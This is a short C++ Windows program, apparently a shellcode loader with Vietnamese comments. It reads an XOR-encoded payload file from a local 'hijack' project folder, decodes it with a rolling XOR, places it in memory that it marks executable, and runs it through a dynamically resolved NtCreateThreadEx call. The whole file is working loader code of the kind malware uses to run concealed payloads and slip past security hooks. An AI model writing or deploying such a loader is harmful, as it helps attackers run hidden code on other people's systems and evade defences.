#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>


void* MemAlloc(SIZE_T size) {
    return VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

void* SetPerm(void* addr, SIZE_T size) {
    DWORD oldProtect;
    VirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);
    return addr;
}

bool RollingXorDecode(std::vector<uint8_t>& data, uint8_t key = 0xAA) {
    for (size_t i = 0; i < data.size(); ++i) {
        uint8_t current = data[i];
        data[i] ^= key;
        key = current;
    }
    return true;
}

typedef NTSTATUS(NTAPI* fNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    LPVOID lpBytesBuffer
    );

int main() {
    const char* path = "C:\\Users\\quang\\OneDrive\\Desktop\\Test\\hijack\\x64\\Release\\data.enc";

    // Đọc file mã hóa
    std::ifstream file(path, std::ios::binary);
    if (!file) {
        std::cerr << "[-] Không đọc được file: " << path << std::endl;
        return -1;
    }

    std::vector<uint8_t> encData((std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>());
    file.close();

    
    RollingXorDecode(encData);

    
    void* mem = MemAlloc(encData.size());
    if (!mem) {
        std::cerr << "[-] memory commit failed" << std::endl;
        return -1;
    }

    
    memcpy(mem, encData.data(), encData.size());
    SetPerm(mem, encData.size());

    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        std::cerr << "[-] can't find ntdll" << std::endl;
        return -1;
    }

    auto pNtCreateThreadEx = (fNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!pNtCreateThreadEx) {
        std::cerr << "[-] can't get NtCreateThreadEx" << std::endl;
        return -1;
    }

    HANDLE hThread = NULL;
    NTSTATUS status = pNtCreateThreadEx(
        &hThread,
        0x1FFFFF,
        NULL,
        GetCurrentProcess(),
        (LPTHREAD_START_ROUTINE)mem,
        NULL,
        FALSE,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (status != 0 || !hThread) {
        std::cerr << "[-] create thread failed: 0x" << std::hex << status << std::endl;
        return -1;
    }

    std::cout << "[+] success !" << std::endl;
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
